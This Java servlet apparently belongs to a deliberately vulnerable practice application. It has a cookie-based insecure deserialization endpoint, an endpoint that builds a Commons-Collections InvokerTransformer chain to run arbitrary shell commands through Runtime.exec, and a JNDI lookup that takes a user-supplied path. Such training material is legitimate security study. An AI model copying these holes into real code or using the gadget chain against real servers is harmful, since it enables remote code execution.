package com.pika.electricrat.serialize;

import com.pika.electricrat.serialize.po.UserSerializeEntity;
import com.pika.electricrat.web.servlet.BaseServlet;
import com.pika.electricrat.rce.RceServlet;
import jakarta.servlet.*;
import jakarta.servlet.http.*;
import jakarta.servlet.annotation.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.*;
import java.util.Base64;


@WebServlet("/serializeAction/*")
public class SerializeServlet extends BaseServlet {

    public void serializeView(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/plan;charset=utf-8");
        try {
            Cookie hasCookie = checkCookie(request);
            if (hasCookie != null){
                if (hasCookie.getValue().equals("deleteMe")){
                    response.getWriter().append("请更新 Cookie rememberMe 并进行请求。");
                    return;
                }
                byte[] decode = Base64.getDecoder().decode(hasCookie.getValue());

                ByteArrayInputStream bytes = new ByteArrayInputStream(decode);
                ObjectInputStream in = new ObjectInputStream(bytes);
                Object o = in.readObject();
                response.getWriter().append(o.toString());
                in.close();
                hasCookie.setMaxAge(0);
                response.addCookie(hasCookie);
            } else {
                response.getWriter().append("请携带 Cookie rememberMe 进行请求。");
            }
        } catch (Exception e){
            e.printStackTrace();
            response.getWriter().append(e.getMessage());
        }
    }

    public void deserialize(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/plan;charset=utf-8");
        String cmd = request.getParameter("cmd");
        ServletOutputStream out = response.getOutputStream();
        int os = RceServlet.SystemInfo();
        ChainedTransformer c = getChainedTransformer(os, cmd);
        UserSerializeEntity entity = new UserSerializeEntity(c);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(outputStream);
        oos.writeObject(entity);
        byte[] res = Base64.getEncoder().encode(outputStream.toByteArray());
        out.write(res);
    }

    private static ChainedTransformer getChainedTransformer(int os, String cmd) {
        String actuator = os == 2 ? "/bin/bash" : "cmd";
        String args = os == 2 ? "-c" : "/c";
        //创建Transformer数组
        Transformer[] invokerTransforms = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String[].class},new Object[]{new String[]{actuator, args, cmd}})
        };
        //创建ChainedTransformer实例
        return new ChainedTransformer(invokerTransforms);
    }


    public void setRememberMe(HttpServletRequest request, HttpServletResponse response) {
        String obj = request.getParameter("obj");
        Cookie cookie = new Cookie("rememberMe", obj);
        response.addCookie(cookie);
    }

    public Cookie checkCookie(HttpServletRequest request){
        Cookie[] cookies = request.getCookies();
        Cookie rbm = null;
        if(cookies != null && cookies.length > 0){
            for (Cookie i : cookies) {
                if (i.getName().equals("rememberMe") && i.getValue() != null && i.getValue().length() > 0) {
                    rbm = i;
                }
            }
        }
        return rbm;
    }

    public void RMIExec(HttpServletRequest request, HttpServletResponse response) throws IOException {
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        try{
            String path = request.getParameter("path");
            if (path == null) {
                response.getWriter().append("请输入 path");
                return;
            }
            Object o = new InitialContext().lookup(path);
        } catch (Exception e){
            response.getWriter().append(e.getMessage());
            e.printStackTrace();
        }
    }
}
